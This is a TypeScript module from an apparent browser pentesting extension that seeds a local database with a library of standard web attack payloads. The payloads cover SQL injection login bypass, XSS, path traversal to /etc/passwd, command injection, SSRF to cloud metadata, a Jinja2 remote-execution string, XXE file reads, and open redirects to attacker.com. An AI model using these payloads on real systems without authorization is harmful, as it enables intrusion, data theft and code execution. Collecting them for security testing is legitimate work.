/**
 * XEOO HACKBAR — Security Testing & HTTP Inspection Chrome Extension
 * 
 * @module PayloadRepository
 * @author Zone Xploiter / ZXMarchia
 * @license MIT
 * @description Local IndexedDB repository and standard pentest test vector seed collection.
 */

import { db, PayloadItem } from '../db';

export const STANDARD_PAYLOADS: Omit<PayloadItem, 'id'>[] = [
  // --- SQL Injection ---
  {
    title: "Classic SQLi Auth Bypass (' OR 1=1--)",
    category: 'SQL Injection',
    subcategory: 'Auth Bypass',
    content: "' OR 1=1-- -",
    description: 'Always-true boolean condition that comments out remainder of query to bypass authentication.',
    tags: ['sqli', 'auth-bypass', 'boolean', 'login'],
    isFavorite: true,
    createdAt: 1700000001000
  },
  {
    title: "Admin Login Bypass (admin' --)",
    category: 'SQL Injection',
    subcategory: 'Auth Bypass',
    content: "admin' -- -",
    description: 'Forces database to authenticate as admin user without checking password.',
    tags: ['sqli', 'auth-bypass', 'admin'],
    isFavorite: true,
    createdAt: 1700000002000
  },
  {
    title: 'Union Query Column Probe (UNION SELECT 1,2,3,4--)',
    category: 'SQL Injection',
    subcategory: 'Union Based',
    content: "' UNION SELECT 1,2,3,4-- -",
    description: 'Tests for reflective column positions in UNION-based SQL injection.',
    tags: ['sqli', 'union', 'column-probe'],
    isFavorite: true,
    createdAt: 1700000003000
  },
  {
    title: 'Time-Based Delay (SLEEP 5s)',
    category: 'SQL Injection',
    subcategory: 'Time Based',
    content: "' AND (SELECT SLEEP(5))-- -",
    description: 'Forces MySQL backend to pause execution for 5 seconds to confirm blind SQL injection.',
    tags: ['sqli', 'time-blind', 'sleep', 'latency'],
    isFavorite: false,
    createdAt: 1700000004000
  },
  {
    title: 'Error-Based Version Extraction (ExtractValue)',
    category: 'SQL Injection',
    subcategory: 'Error Based',
    content: "' AND ExtractValue(1, concat(0x5c, (SELECT @@version)))-- -",
    description: 'Triggers XPath syntax error in MySQL to reflect database version in error message.',
    tags: ['sqli', 'error-based', 'extractvalue', 'mysql'],
    isFavorite: false,
    createdAt: 1700000005000
  },
  {
    title: "Quote-Balanced Condition (' OR ''=')",
    category: 'SQL Injection',
    subcategory: 'Auth Bypass',
    content: "' OR ''='",
    description: 'Balances single quotes naturally without using comment characters.',
    tags: ['sqli', 'quote-balanced', 'waf-friendly'],
    isFavorite: false,
    createdAt: 1700000006000
  },

  // --- Cross-Site Scripting (XSS) ---
  {
    title: 'Standard Script Tag (<script>alert(1)</script>)',
    category: 'Cross-Site Scripting (XSS)',
    subcategory: 'Stored & Reflected',
    content: '<script>alert(1)</script>',
    description: 'Classic JavaScript execution vector for raw HTML injection contexts.',
    tags: ['xss', 'script-tag', 'alert', 'client-side'],
    isFavorite: true,
    createdAt: 1700000007000
  },
  {
    title: 'Image OnError Vector (<img src=x onerror=alert(1)>)',
    category: 'Cross-Site Scripting (XSS)',
    subcategory: 'Event Handlers',
    content: '<img src=x onerror=alert(1)>',
    description: 'Triggers script execution when browser fails to load broken image source.',
    tags: ['xss', 'img-tag', 'onerror', 'event-handler'],
    isFavorite: true,
    createdAt: 1700000008000
  },
  {
    title: 'SVG OnLoad Vector (<svg onload=alert(1)>)',
    category: 'Cross-Site Scripting (XSS)',
    subcategory: 'Event Handlers',
    content: '<svg onload=alert(1)>',
    description: 'Executes JavaScript immediately upon SVG XML rendering without user interaction.',
    tags: ['xss', 'svg', 'onload', 'filter-bypass'],
    isFavorite: true,
    createdAt: 1700000009000
  },
  {
    title: 'Attribute Context Escape ("><script>alert(1)</script>)',
    category: 'Cross-Site Scripting (XSS)',
    subcategory: 'Context Breakout',
    content: '"><script>alert(1)</script>',
    description: 'Breaks out of existing HTML attribute value (e.g. value="...") into new script block.',
    tags: ['xss', 'attribute-breakout', 'escaping'],
    isFavorite: false,
    createdAt: 1700000010000
  },
  {
    title: 'JavaScript Pseudo-Protocol (javascript:alert(1))',
    category: 'Cross-Site Scripting (XSS)',
    subcategory: 'URI Schemes',
    content: 'javascript:alert(1)',
    description: 'Executes script inside href, src, or form action attributes supporting pseudo-protocols.',
    tags: ['xss', 'javascript-uri', 'href-context'],
    isFavorite: false,
    createdAt: 1700000011000
  },
  {
    title: 'Autofocus Execution (<input autofocus onfocus=alert(1)>)',
    category: 'Cross-Site Scripting (XSS)',
    subcategory: 'Event Handlers',
    content: '<input autofocus onfocus=alert(1)>',
    description: 'Executes immediately when the newly injected input gains automatic page focus.',
    tags: ['xss', 'autofocus', 'onfocus', 'dom'],
    isFavorite: false,
    createdAt: 1700000012000
  },

  // --- Path Traversal & LFI ---
  {
    title: 'Linux /etc/passwd Relative Traversal (../../../../etc/passwd)',
    category: 'Path Traversal & LFI',
    subcategory: 'Local File Inclusion',
    content: '../../../../etc/passwd',
    description: 'Climbs directory hierarchy to read user account list on Linux/Unix systems.',
    tags: ['lfi', 'traversal', 'linux', 'passwd'],
    isFavorite: true,
    createdAt: 1700000013000
  },
  {
    title: 'URL-Encoded Directory Traversal (..%2f..%2f..%2fetc%2fpasswd)',
    category: 'Path Traversal & LFI',
    subcategory: 'Filter Bypass',
    content: '..%2f..%2f..%2f..%2fetc%2fpasswd',
    description: 'Bypasses basic string filters looking for plain "../" sequences.',
    tags: ['lfi', 'url-encoded', 'filter-bypass'],
    isFavorite: false,
    createdAt: 1700000014000
  },
  {
    title: 'PHP Filter Base64 Source Exfiltration',
    category: 'Path Traversal & LFI',
    subcategory: 'PHP Wrappers',
    content: 'php://filter/convert.base64-encode/resource=index.php',
    description: 'Reads PHP source code without execution by Base64 encoding the stream before output.',
    tags: ['lfi', 'php-filter', 'base64', 'source-disclosure'],
    isFavorite: true,
    createdAt: 1700000015000
  },
  {
    title: 'Null Byte File Extension Poisoning (%00)',
    category: 'Path Traversal & LFI',
    subcategory: 'Null Byte',
    content: '../../../../etc/passwd%00.html',
    description: 'Truncates appended file extensions on legacy PHP (< 5.3.4) and C file APIs.',
    tags: ['lfi', 'null-byte', 'poisoning'],
    isFavorite: false,
    createdAt: 1700000016000
  },
  {
    title: 'Windows win.ini Traversal (../../../../windows/win.ini)',
    category: 'Path Traversal & LFI',
    subcategory: 'Windows Target',
    content: '../../../../windows/win.ini',
    description: 'Standard proof of concept file for Windows server directory traversal.',
    tags: ['lfi', 'windows', 'win-ini'],
    isFavorite: false,
    createdAt: 1700000017000
  },

  // --- Command Injection (RCE) ---
  {
    title: 'Pipe Separator (| whoami)',
    category: 'Command Injection (RCE)',
    subcategory: 'Separators',
    content: '| whoami',
    description: 'Redirects preceding stdout into execution of whoami command.',
    tags: ['rce', 'command-injection', 'pipe', 'whoami'],
    isFavorite: true,
    createdAt: 1700000018000
  },
  {
    title: 'Semicolon Command Chaining (; id)',
    category: 'Command Injection (RCE)',
    subcategory: 'Separators',
    content: '; id',
    description: 'Chains sequential command execution to identify running user on Unix hosts.',
    tags: ['rce', 'semicolon', 'id', 'unix'],
    isFavorite: true,
    createdAt: 1700000019000
  },
  {
    title: 'Subshell Command Execution ($(whoami))',
    category: 'Command Injection (RCE)',
    subcategory: 'Subshell',
    content: '$(whoami)',
    description: 'Executes command inside subshell substitution syntax for Bash/Zsh.',
    tags: ['rce', 'subshell', 'bash'],
    isFavorite: false,
    createdAt: 1700000020000
  },
  {
    title: 'Windows Ampersand Separator (& dir)',
    category: 'Command Injection (RCE)',
    subcategory: 'Windows',
    content: '& dir',
    description: 'Executes dir listing on Windows command prompt.',
    tags: ['rce', 'windows', 'ampersand', 'dir'],
    isFavorite: false,
    createdAt: 1700000021000
  },

  // --- Server-Side Request Forgery (SSRF) ---
  {
    title: 'AWS EC2 Instance Metadata (169.254.169.254)',
    category: 'SSRF & Cloud Metadata',
    subcategory: 'Cloud Providers',
    content: 'http://169.254.169.254/latest/meta-data/',
    description: 'Queries AWS link-local IP to extract cloud instance metadata and IAM tokens.',
    tags: ['ssrf', 'aws', 'metadata', 'cloud'],
    isFavorite: true,
    createdAt: 1700000022000
  },
  {
    title: 'GCP Compute Instance Metadata',
    category: 'SSRF & Cloud Metadata',
    subcategory: 'Cloud Providers',
    content: 'http://metadata.google.internal/computeMetadata/v1/',
    description: 'Queries Google Cloud compute engine metadata service endpoint.',
    tags: ['ssrf', 'gcp', 'metadata', 'google-cloud'],
    isFavorite: false,
    createdAt: 1700000023000
  },
  {
    title: 'Internal Localhost Service (127.0.0.1:8080)',
    category: 'SSRF & Cloud Metadata',
    subcategory: 'Internal Networks',
    content: 'http://127.0.0.1:8080/',
    description: 'Probes internal web services or admin panels listening only on loopback.',
    tags: ['ssrf', 'localhost', 'loopback', 'internal'],
    isFavorite: false,
    createdAt: 1700000024000
  },

  // --- Server-Side Template Injection (SSTI) ---
  {
    title: 'Polyglot Arithmetic Expression (${7*7})',
    category: 'Template Injection (SSTI)',
    subcategory: 'Polyglots',
    content: '${7*7}',
    description: 'Evaluates arithmetic in Java EL, JSP, and MVEL (returns 49 if vulnerable).',
    tags: ['ssti', 'math-eval', 'polyglot', 'java'],
    isFavorite: true,
    createdAt: 1700000025000
  },
  {
    title: 'Double Curly Expression ({{7*7}})',
    category: 'Template Injection (SSTI)',
    subcategory: 'Polyglots',
    content: '{{7*7}}',
    description: 'Evaluates arithmetic in Jinja2, Twig, Blade, and Vue/Angular template compilers.',
    tags: ['ssti', 'jinja2', 'twig', 'curly'],
    isFavorite: true,
    createdAt: 1700000026000
  },
  {
    title: 'Jinja2 (Python) OS Command Execution PoC',
    category: 'Template Injection (SSTI)',
    subcategory: 'Python Jinja2',
    content: "{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}",
    description: 'Traverses Python runtime context in Jinja2 to execute os.popen and return output.',
    tags: ['ssti', 'jinja2', 'python', 'rce'],
    isFavorite: false,
    createdAt: 1700000027000
  },

  // --- XML External Entity (XXE) ---
  {
    title: 'XXE Linux /etc/passwd Extraction',
    category: 'XML & External Entity (XXE)',
    subcategory: 'Local File Read',
    content: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    description: 'Defines external SYSTEM entity pointing to /etc/passwd on target host.',
    tags: ['xxe', 'xml', 'file-read', 'etc-passwd'],
    isFavorite: true,
    createdAt: 1700000028000
  },

  // --- Open Redirect & CRLF ---
  {
    title: 'Protocol-Relative Open Redirect (//attacker.com)',
    category: 'Open Redirect & CRLF',
    subcategory: 'Open Redirect',
    content: '//attacker.com',
    description: 'Uses protocol-relative URL to redirect browser while retaining current scheme (http/https).',
    tags: ['open-redirect', 'protocol-relative', 'phishing'],
    isFavorite: false,
    createdAt: 1700000029000
  },
  {
    title: 'Backslash Delimiter Bypass (/\\attacker.com)',
    category: 'Open Redirect & CRLF',
    subcategory: 'Open Redirect',
    content: '/\\attacker.com',
    description: 'Exploits parser differential where backslash is normalized to slash by web browsers.',
    tags: ['open-redirect', 'backslash', 'bypass'],
    isFavorite: false,
    createdAt: 1700000030000
  },
  {
    title: 'CRLF Set-Cookie Response Splitting',
    category: 'Open Redirect & CRLF',
    subcategory: 'CRLF Injection',
    content: '%0d%0aSet-Cookie: session=xeoo_hackbar_test; path=/',
    description: 'Injects Carriage Return & Line Feed to insert arbitrary Set-Cookie response header.',
    tags: ['crlf', 'response-splitting', 'cookie-injection'],
    isFavorite: false,
    createdAt: 1700000031000
  }
];

export const PayloadRepository = {
  async getAll(): Promise<PayloadItem[]> {
    return await db.payloads.toArray();
  },

  async getByCategory(category: string): Promise<PayloadItem[]> {
    return await db.payloads.where('category').equals(category).toArray();
  },

  async add(item: Omit<PayloadItem, 'id'>): Promise<number> {
    return await db.payloads.add({
      ...item,
      createdAt: item.createdAt || Date.now()
    } as PayloadItem);
  },

  async update(id: number, changes: Partial<PayloadItem>): Promise<number> {
    return await db.payloads.update(id, changes);
  },

  async delete(id: number): Promise<void> {
    await db.payloads.delete(id);
  },

  async toggleFavorite(id: number, current: boolean): Promise<number> {
    return await db.payloads.update(id, { isFavorite: !current });
  },

  async bulkAdd(items: Omit<PayloadItem, 'id'>[]): Promise<void> {
    await db.payloads.bulkAdd(items as PayloadItem[]);
  },

  async resetToDefaults(): Promise<void> {
    await db.payloads.clear();
    await db.payloads.bulkAdd(STANDARD_PAYLOADS as PayloadItem[]);
  },

  async seedDefaults(): Promise<void> {
    const count = await db.payloads.count();
    // If empty or only has the old 5 generic placeholders, upgrade to full standard library
    if (count === 0) {
      await db.payloads.bulkAdd(STANDARD_PAYLOADS as PayloadItem[]);
    } else if (count <= 5) {
      const existing = await db.payloads.toArray();
      const existingTitles = new Set(existing.map((e) => e.title));
      const missing = STANDARD_PAYLOADS.filter((p) => !existingTitles.has(p.title));
      if (missing.length > 0) {
        await db.payloads.bulkAdd(missing as PayloadItem[]);
      }
    }
  }
};
